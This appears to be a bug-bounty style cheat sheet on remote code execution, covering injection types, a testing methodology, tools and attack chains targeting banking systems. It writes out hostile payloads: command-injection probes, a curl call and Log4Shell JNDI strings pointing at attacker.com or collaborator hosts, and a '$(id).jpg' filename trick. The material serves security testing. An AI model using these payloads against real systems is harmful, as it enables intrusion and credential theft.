# 18 — Remote Code Execution (RCE)

**CWE-78/94/502** | **CVSS: 9.8–10.0 Critical** | **OWASP A03:2021**

---

## What Is It?

RCE allows attacker to execute arbitrary commands on the target server. Can lead to full server compromise, lateral movement, and data exfiltration.

> **Core Problem:** User-supplied input is passed to OS commands, `eval()`, or deserializer without sanitization.

---

## Vulnerability Types

| Type | Description |
|------|-------------|
| **Command Injection** | System call with user input: `ping` → `ping 127.0.0.1; id` |
| **Code Injection** | `eval(user_input)` in PHP/JS/Python — execute arbitrary code. |
| **Deserialization RCE** | Java/PHP/Python deserialization gadget chains leading to code execution. |
| **File Upload RCE** | Upload webshell → access via URL → execute commands. |
| **SSTI → RCE** | Template injection in Jinja2/Twig/Freemarker executing OS commands. |
| **Log4Shell** | JNDI injection via `${jndi:ldap://attacker.com/a}` → RCE. |

---

## Hunting Methodology

1. Test command injection: `; id`, `| id`, `&& id`, `` `id` ``, `$(id)` in all input fields.
2. Blind command injection: `; sleep 5` — measure response time.
3. OOB command injection: `; curl http://collaborator.com` — DNS/HTTP hit confirms RCE.
4. Test all serialization points for known gadget chains.
5. Test file upload endpoints for webshell bypass techniques.
6. Test Log4j if Java backend: `${jndi:ldap://collaborator.com/x}` in all headers.
7. Banking: test admin functions, report generation, file processing for command injection.

---

## Essential Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite + Collaborator** | Detect blind RCE via OOB DNS/HTTP. |
| **ysoserial** | Java deserialization RCE payload generator. |
| **commix** | Automated command injection exploitation. |
| **Nuclei** | RCE template scanning for known CVEs. |

---

## Tips & Tricks

- **#1** Blind RCE: always use Burp Collaborator — timing attacks and OOB are key for blind detection.
- **#2** Log4j: test `${jndi:ldap://...}` in ALL headers: `User-Agent`, `X-Forwarded-For`, `Referer`.
- **#3** Command injection via filename: upload file named `$(id).jpg` — may trigger on server processing.
- **#4** Document RCE carefully: run `id`, `whoami` — never run destructive commands in PoC.

---

## Deadly Chains

```
File upload → RCE → reverse shell → lateral movement → domain admin
SSTI → RCE → read /etc/passwd, env vars → extract credentials
Deserialization → RCE → cloud metadata → IAM → full cloud account
Log4Shell → RCE → banking server → transaction DB access
```
